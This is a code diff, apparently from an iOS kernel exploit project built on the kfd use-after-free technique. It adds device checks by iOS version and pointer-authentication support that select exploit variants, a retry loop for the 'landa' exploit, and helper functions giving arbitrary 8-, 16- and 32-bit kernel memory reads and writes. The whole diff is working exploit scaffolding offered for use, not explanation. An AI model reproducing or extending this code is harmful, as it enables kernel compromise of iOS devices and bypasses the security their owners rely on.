@@ -20,17 +20,50 @@
 #include <mach-o/nlist.h>
 #include <mach-o/reloc.h>
 
+bool isarm64e(void) {
+    int ptrAuthVal = 0;
+    size_t len = sizeof(ptrAuthVal);
+    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
+    if(ptrAuthVal != 0)
+        return true;
+    return false;
+}
+
 int isAvailable(void) {
+    int ptrAuthVal = 0;
+    size_t len = sizeof(ptrAuthVal);
+    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
     if (@available(iOS 17.0, *)) {
-        return 3;
+        return 12;
     }
     if (@available(iOS 16.4, *)) {
-        return 2;
+        if (isarm64e())
+            return 11;
+        return 10;
     }
     if (@available(iOS 16.2, *)) {
-        return 1;
+        if (isarm64e())
+            return 9;
+        return 8;
     }
     if (@available(iOS 16.0, *)) {
+        if (isarm64e())
+            return 7;
+        return 6;
+    }
+    if (@available(iOS 15.4, *)) {
+        if (isarm64e())
+            return 5;
+        return 4;
+    }
+    if (@available(iOS 15.2, *)) {
+        if (isarm64e())
+            return 3;
+        return 2;
+    }
+    if (@available(iOS 15.1, *)) {
+        if (isarm64e())
+            return 1;
         return 0;
     }
     return -1;
@@ -53,9 +86,29 @@ void kfd_free(struct kfd* kfd) {
 }
 
 uint64_t kopen(uint64_t exploit_type) {
+    int fail = -1;
+    
     struct kfd* kfd = kfd_init(exploit_type);
+    
+    kfd->info.env.exploit_type = exploit_type;
+
+retry:
     puaf_run(kfd);
-    krkw_run(kfd);
+    
+    fail = krkw_run(kfd);
+    
+    if(fail && (exploit_type == MEOW_EXPLOIT_LANDA)) {
+        // TODO: fix memory leak
+        puaf_free(kfd);
+        info_free(kfd);
+        bzero(kfd, sizeof(struct kfd));
+        info_init(kfd);
+        puaf_init(kfd, exploit_type);
+        krkw_init(kfd);
+        perf_init(kfd);
+        goto retry;
+    }
+    
     info_run(kfd);
     puaf_cleanup(kfd);
     
@@ -88,10 +141,67 @@ uint64_t kread64_kfd(uint64_t va) {
     return u;
 }
 
+uint32_t kread32_kfd(uint64_t va) {
+    union {
+        uint32_t u32[2];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    return u.u32[0];
+}
+
+uint16_t kread16_kfd(uint64_t va) {
+    union {
+        uint16_t u16[4];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    return u.u16[0];
+}
+
+uint8_t kread8_kfd(uint64_t va) {
+    union {
+        uint8_t u8[8];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    return u.u8[0];
+}
+
 void kwrite64_kfd(uint64_t va, uint64_t val) {
     uint64_t u[1] = {};
     u[0] = val;
     kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
+}
+
+void kwrite32_kfd(uint64_t va, uint32_t val) {
+    union {
+        uint32_t u32[2];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    u.u32[0] = val;
+    kwrite64_kfd(va, u.u64);
+}
+
+void kwrite16_kfd(uint64_t va, uint16_t val) {
+    union {
+        uint16_t u16[4];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    u.u16[0] = val;
+    kwrite64_kfd(va, u.u64);
+}
+
+void kwrite8_kfd(uint64_t va, uint8_t val) {
+    union {
+        uint8_t u8[8];
+        uint64_t u64;
+    } u;
+    u.u64 = kread64_kfd(va);
+    u.u8[0] = val;
+    kwrite64_kfd(va, u.u64);
 }
 
 uint64_t get_kaslr_slide(void) {
